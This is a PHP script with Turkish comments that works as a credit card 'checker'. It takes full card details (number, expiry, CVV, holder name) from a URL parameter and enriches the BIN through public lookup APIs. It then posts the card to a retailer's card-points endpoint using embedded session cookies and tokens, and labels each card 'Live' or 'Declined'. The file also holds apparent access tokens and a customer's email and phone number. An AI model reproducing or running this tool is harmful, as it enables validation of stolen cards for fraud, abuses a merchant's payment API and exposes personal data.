<?php
// Çıktının karakter setini ve türünü belirliyoruz. Bu olmazsa olmaz.
header('Content-Type: text/plain; charset=utf-8');

// --- BAŞLANGIÇ ZAMANINI KAYDET ---
$start_time = microtime(true);

// 1. URL'den 'cc' parametresini al
$cc_full = isset($_GET['cc']) ? $_GET['cc'] : '';

// Parametre kontrolleri
if (empty($cc_full)) {
    http_response_code(400 );
    echo "❌ Hata: 'cc' parametresi eksik. Kullanım: ?cc=KARTNO|AY|YIL|CVV|ISIM SOYISIM";
    exit;
}
$cc_parts = explode('|', $cc_full);
if (count($cc_parts) < 5) {
    http_response_code(400 );
    echo "❌ Hata: 'cc' parametresi yanlış formatta. Kullanım: ?cc=KARTNO|AY|YIL|CVV|ISIM SOYISIM";
    exit;
}

// 2. Değişkenlere ata
list($kart_no, $ay, $yil, $cvv, $isim) = $cc_parts;
$bin = substr($kart_no, 0, 6);

// --- ÇOKLU BIN API SORGULAMA FONKSİYONU ---
function getBinInfo($bin) {
    $bin_info = ['kart_tipi' => 'UNKNOWN', 'banka' => 'UNKNOWN', 'ulke' => 'UNKNOWN', 'ulke_kodu' => ''];
    
    // API 1: Bincheck.io
    $bincheck_url = "https://bincheck.io/api/v1/bin/" . $bin;
    $response1 = @file_get_contents($bincheck_url );
    if ($response1) {
        $data = json_decode($response1, true);
        if (!empty($data['scheme'])) {
            $bin_info['kart_tipi'] = strtoupper(($data['scheme'] ?? '') . ' ' . ($data['type'] ?? ''));
            $bin_info['banka'] = strtoupper($data['bank'] ?? 'UNKNOWN');
            $bin_info['ulke'] = strtoupper($data['country_name'] ?? 'UNKNOWN');
            $bin_info['ulke_kodu'] = $data['country_code'] ?? '';
            return $bin_info;
        }
    }

    // API 2: Binlist.io
    $binlist_url = "https://binlist.io/lookup/" . $bin;
    $response2 = @file_get_contents($binlist_url );
    if ($response2) {
        $data = json_decode($response2, true);
        if (!empty($data['scheme'])) {
            $bin_info['kart_tipi'] = strtoupper(($data['scheme'] ?? '') . ' ' . ($data['type'] ?? '') . ' ' . ($data['brand'] ?? ''));
            $bin_info['banka'] = strtoupper($data['bank']['name'] ?? 'UNKNOWN');
            $bin_info['ulke'] = strtoupper($data['country']['name'] ?? 'UNKNOWN');
            $bin_info['ulke_kodu'] = $data['country']['alpha2'] ?? '';
            return $bin_info;
        }
    }
    
    return $bin_info;
}

// Kart bilgilerini çek
$bin_data = getBinInfo($bin);
extract($bin_data);

// --- FAİK SÖNMEZ API İSTEĞİ (SON BİLGİLERLE GÜNCELLENDİ) ---
$url = "https://www.faiksonmez.com/api/get-credit-card-point";
$payload = json_encode([
    "creditCard" => ["number" => $kart_no, "owner" => $isim, "cvc" => $cvv, "expireMonth" => $ay, "expireYear" => $yil],
    "money" => ["amount" => 4499.5, "currencyId" => 1]
] );
$headers = [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
    'Content-Type: text/plain;charset=UTF-8',
    'userid: 233387',
    'origin: https://www.faiksonmez.com',
    'referer: https://www.faiksonmez.com/teslimat-ve-odeme',
];
$cookie = 'HWWAFSESTIME=1768748183954; HWWAFSESID=a2c9273ec7ca79f3f4; viewType=%7B%22mobile%22%3A1%2C%22desktop%22%3A2%7D; access_token=eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJVSG9ZUTg1S3J4TzNMMmlEUUNfMUE2MXJucy1jQ3pJdjVIbms3SF9ZbnZvIn0.eyJleHAiOjE3Njg3NDg0OTcsImlhdCI6MTc2ODc0ODE5NywianRpIjoiZTQ2NGY0NjYtZjkwMS00NGZkLTlhYmYtNWJhZjJkZjIzYzk1IiwiaXNzIjoiaHR0cHM6Ly9pZGVudGl0eS5mYWlrc29ubWV6LmNvbS9yZWFsbXMvZmFpa3Nvbm1leiIsImF1ZCI6ImFjY291bnQiLCJzdWIiOiI2MjAxYTE2ZS1lYjdlLTQzOWQtYmY3Zi0zYmIxYTU5YjdkZDIiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJmYWlrc29ubWV6X2NsaWVudCIsImFjciI6IjEiLCJhbGxvd2VkLW9yaWdpbnMiOlsiLyoiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbImRlZmF1bHQtcm9sZXMtZmFpa3Nvbm1leiIsIm9mZmxpbmVfYWNjZXNzIiwidW1hX2F1dGhvcml6YXRpb24iXX0sInJlc291cmNlX2FjY2VzcyI6eyJmYWlrc29ubWV6X2NsaWVudCI6eyJyb2xlcyI6WyJ1bWFfcHJvdGVjdGlvbiJdfSwiYWNjb3VudCI6eyJyb2xlcyI6WyJtYW5hZ2UtYWNjb3VudCIsIm1hbmFnZS1hY2NvdW50LWxpbmtzIiwidmlldy1wcm9maWxlIl19fSwic2NvcGUiOiJwcm9maWxlIGVtYWlsIiwiY2xpZW50SG9zdCI6IjIxMy4yNTAuMTQxLjI0NSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwicHJlZmVycmVkX3VzZXJuYW1lIjoic2VydmljZS1hY2NvdW50LWZhaWtzb25tZXpfY2xpZW50IiwiY2xpZW50QWRkcmVzcyI6IjIxMy4yNTAuMTQxLjI0NSIsImNsaWVudF9pZCI6ImZhaWtzb25tZXpfY2xpZW50In0.QF4_umfGOEo3uM0NEPAp3k_gRhFhF_4jfdFc-3wkyP4i1k-NEGPlUhcNeavJsEWfzjT-10IJyf48yMqYrxXn0iL7_F7CzyVV2mcyNwIAWjRpB4yZEsu0Cov8nMnVjRzhdVR1_Q7Uj1byTZ6wYPkrAQEnFkoTloZIeXa3kjsBSrVQ2k8jo-kUe5Vosf6-Z3BrmcbQLgPihqpZOQABIzrDKPJPEjvzyaOSiyQNqvCgV2r_fsC31gs8JgLw0ZvwKbzaF4W5IRpBWvPgNyzVYdMVF00X9F_yP7vP8uLXbAW_Cd1MmtH7gMNd9Tr6AVfRDID1tbxOyI1t6mCXsXOCzSSCYg; output-cache-key=Cri_1; _fbp=fb.1.1768748200987.744422025850419533; strw-699-vt=0_1768748203434; ccpu=Vp3bxY8sjuFE.1768748358; cookie_consent_user_accepted=true; _gcl_gs=2.1.k1$i1768748194$u252013086; _gid=GA1.2.109233004.1768748359; ccpa=18e072d3-d872-0155-1631-2d54b4f19a82; cookie_consent_level=%7B%22strictly-necessary%22%3Atrue%2C%22functionality%22%3Atrue%2C%22tracking%22%3Atrue%2C%22targeting%22%3Atrue%7D; _gac_UA-26398969-1=1.1768748361.Cj0KCQiAprLLBhCMARIsAEDhdPeCGTg5eQZGaUeiGeg1y5ZlfkJ3fIDJx9lkVwaWBO7zzLkw8Weac1IaAuT_EALw_wcB; _gcl_aw=GCL.1768748362.Cj0KCQiAprLLBhCMARIsAEDhdPeCGTg5eQZGaUeiGeg1y5ZlfkJ3fIDJx9lkVwaWBO7zzLkw8Weac1IaAuT_EALw_wcB; _ga=GA1.1.428229509.1768748200; strw-699-tpvc=2; strw-699-spvc=2; x-culture=tr; _gcl_au=1.1.1024245118.1768748359.272926254.1768748447.1768748446; active_member=%7B%22id%22%3A233387%2C%22name%22%3A%22d%C5%9Fd%C3%B6%22%2C%22surname%22%3A%22%C3%A7dd%C3%A7%22%2C%22email%22%3A%22arisune0177227%40gmail.com%22%2C%22mobilePhone%22%3A%225376238375%22%2C%22defaultLanguage%22%3A%22tr%22%2C%22isGuest%22%3Atrue%2C%22isEmailPermitted%22%3Afalse%2C%22isSmsPermitted%22%3Afalse%2C%22isCallPermitted%22%3Afalse%7D; _ga_Z4VR1XZHGC=GS2.1.s1768748361$o1$g1$t1768748490$j60$l0$h669108436; last_token_check=1768748491301; environment_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJkZjNkNWZlZi0zMDgwLTQ5MmYtYjE3OC1iMTMwM2M5ZjgwOGQiLCJUeXBlIjoiRW52aXJvbm1lbnQiLCJWZXJzaW9uIjoiMyIsIm5iZiI6MTc2ODc0ODQ5MSwiZXhwIjoxNzY4OTQ4MTc3LCJpYXQiOjE3Njg3NDg0OTEsImlzcyI6Imh0dHBzOi8vd3d3LmZhaWtzb25tZXouY29tLyIsIlVzZXJEYXRhIjoie1wiTWVtYmVyXCI6XCJ7XFxcImlkXFxcIjoyMzMzODcsXFxcImlzR3N0XFxcIjp0cnVlLFxcXCJlbWFpbFxcXCI6XFxcImFyaXN1bmUwMTc3MjI3QGdtYWlsLmNvbVxcXCJ9XCIsXCJTaHBuZ0NydElkXCI6XCJlZTlTYnRYcG1PNUtJUnM1Y1pTN2xBT2hFUU8rTnBHaWs1TkpyUHM5c3ZBPVwiLFwiQWRkcmVzc1pvbmVcIjpcIltdXCIsXCJDbnRyeVwiOlwiVFJcIixcIk1tYnJPcmRyQ250XCI6XCIwXCIsXCJQbHRmcm1JZFwiOlwiMlwiLFwiQ2hubFwiOlwiMVwiLFwiUHJjVHlwR3JwSWRcIjpcIjFcIixcIlRtem5cIjpcIlR1cmtleSBTdGFuZGFyZCBUaW1lXCIsXCJDdXJySWRcIjpcIjFcIixcIlByY1R5cElkXCI6XCIxXCIsXCJEZWZQcmNUeXBJZFwiOlwiMVwiLFwiUHltbnRUeXBcIjpcIntcXFwiUGF5bWVudFR5cGVJZFxcXCI6MyxcXFwiUGF5bWVudE1ldGhvZFxcXCI6MX1cIixcIlNwXCI6XCIwXCIsXCJFc3BcIjpcIjBcIixcIkJua1BudFwiOlwiMFwiLFwiQm5rQ3JkXCI6XCJ7XFxcIkNhcmRCaW5cXFwiOlxcXCI0NTQzNjAwM1xcXCIsXFxcIkNhcmRCaW5JZFxcXCI6MTkyMCxcXFwiQmFua0lkXFxcIjo0fVwifSIsImF1ZCI6Imh0dHBzOi8vd3d3LmZhaWtzb25tZXouY29tLyJ9.AtoVZzedgAP_VWzjPmYipKwn8KKQXuYdFT050CctMqwDH69dggftepLVkGhuHB6CS0N1BzH1jiZYIFq22iooHeKjmTFmRbbeQ2Xe1ZVA302m312KP7BP8DYGqejD4xdP7d-JxG2s6lo6MLBBFWDqNtOG1RrVVFY7i55PtUxsDe7dJwHGlnvorPnmj1FHgB-Fu6dLHuauTTHrj_Yy4ejbZuyEOGlEI9qIvkyb5cOHo2HCCBO07rAdep2sS8cNpVpMZ1sGt-MSvUdtXBFTfwtpwaYcNtnhKe5sScd7VGKYtb-Ekw5au31PFR3vTxN7GiX-4K0tDhaWkxOUpuk1TijM8w; strw-699-ttt=234; strw-699-stt=234; strw-699-ptt=141';

$ch = curl_init($url );
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
$response = curl_exec($ch);
$curl_error = curl_error($ch);
curl_close($ch);

// --- YANITI İŞLE VE ÇIKTIYI OLUŞTUR ---
$end_time = microtime(true);
$sure = number_format($end_time - $start_time, 2);

if ($curl_error) {
    echo "Declined ❌\n";
    echo "Card: {$cc_full}\n";
    echo "Gateway: @korktun - Point Lookup\n";
    echo "Error: API/Proxy Bağlantı Hatası\n";
    echo "Details: {$curl_error}\n";
    echo "Süre: {$sure}s\n";
    exit;
}

$data = json_decode($response, true);

if (isset($data['point']['amount']) && $data['point']['amount'] > 0) {
    $puan = $data['point']['amount'];
    $durum_yazi = "Live ✅";
    $puan_cikti = "⤿ {$puan} TL ✅ ⤾";
} else {
    $durum_yazi = "Declined ❌";
    $puan_cikti = "Puan Yok ❌";
}

function get_flag_emoji($country_code) {
    if (empty($country_code) || strlen($country_code) != 2) return '🏳️';
    $regional_indicator_a = 0x1F1E6;
    $char1 = ord(strtoupper($country_code[0])) - ord('A') + $regional_indicator_a;
    $char2 = ord(strtoupper($country_code[1])) - ord('A') + $regional_indicator_a;
    return mb_chr($char1, 'UTF-8') . mb_chr($char2, 'UTF-8');
}
$bayrak = get_flag_emoji($ulke_kodu);

// --- EFSANE ÇIKTIYI OLUŞTUR (ALT ALTA) ---
echo "{$durum_yazi}\n";
echo "Card: {$cc_full}\n";
echo "Puan: {$puan_cikti}\n";
echo "Banka: {$banka}\n";
echo "Kart Tipi: {$kart_tipi}\n";
echo "Ülke: {$ulke} {$bayrak}\n";
echo "Gateway: @korktun - Point Lookup\n";
echo "Süre: {$sure}s\n";
echo "Checked by: noct.dat\n";

?>
